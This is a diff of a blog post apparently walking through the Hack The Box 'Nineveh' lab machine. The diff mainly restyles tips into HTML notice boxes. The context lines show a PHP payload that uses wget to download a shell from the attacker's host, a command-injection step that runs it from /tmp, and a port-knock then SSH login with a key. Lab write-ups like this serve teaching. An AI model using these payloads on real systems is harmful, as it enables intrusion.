@@ -49,7 +49,10 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 49.08 seconds
 ```
-> HTTP on port 80 and HTTPS on 443
+<div class="notice--info">
+  <h4>Ports of interest:</h4>
+  <p> HTTP on port 80 and HTTPS on 443 </p>
+</div>
 
 ***
 
@@ -69,7 +72,11 @@ Gobuster v1.2                OJ Reeves (@TheColonial)
 =====================================================
 http://10.10.10.43/department (Status: 301)
 ```
-> Install gobuster by: apt-get install gobuster
+
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>Install gobuster by with <b>apt-get install gobuster<b></p>
+</div>
 
 `/department/` directory presents us with what looks like a custom login page:
 
@@ -227,7 +234,7 @@ There are many methods one can choose in order to compromise the application, bu
 
 <div class="notice--info">
   <h4>Note:</h4>
-  <p>If you save the file as <b>.php</b> it would get activated on your own server when you wget it later on - <em>be careful about it</em>. That's why we save it as **.txt** and output it to <b>.php</b>.</p>
+  <p>If you save the file as <b>.php</b> it would get activated on your own server when you wget it later on - <em>be careful about it</em>. That's why we save it as **.txt** and output it to <b>.php</b></p>
 </div>
 
 To proceed with the exploitation do as the exploitdb file says. Create a database with *.php* extension (I named it shell.php, name doesn't matter!):
@@ -248,8 +255,11 @@ Name the field whatever we wish, set it as text type, put `<?php system("wget YO
 
 `;php /tmp/shell.php - runs the php file with our malicious payload inside`
 
-> Make sure you use `-O` (capital) because `-o` has different output which won't work!
- 
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>Make sure you use <b>-O</b> (capital) because <b>-o</b> has different output which won't work!</p>
+</div>
+    
 To activate our php script that downloads the malicious file, an HTTP request is needed. How would we do such thing though? Remember the previous dashboard we found on port 80? Look at the url after clicking "Notes":
 
 <img src="/assets/img/blog/htb-nineveh/htb-nineveh-12.png">
@@ -387,7 +397,10 @@ Now using the combination of nmap and ssh you can easily log into the machine:
 ```console
 root@EdgeOfNight:~# nmap -Pn --host-timeout 201 --max-retries 0 -p 571,290,911 10.10.10.43 && ssh -i sshkey.key amrois@10.10.10.43 
 ```
-> If you get an error saying that the ".key file is unprotected", simply chmod it to 600
+<div class="notice--info">
+  <h4>Note:</h4>
+  <p>If you get an error saying that the ".key file is unprotected", simply chmod it to 600</p>
+</div>
 
 After authenticating You can get the user flag and use the same `chkrootkit` escalation method as before!
 
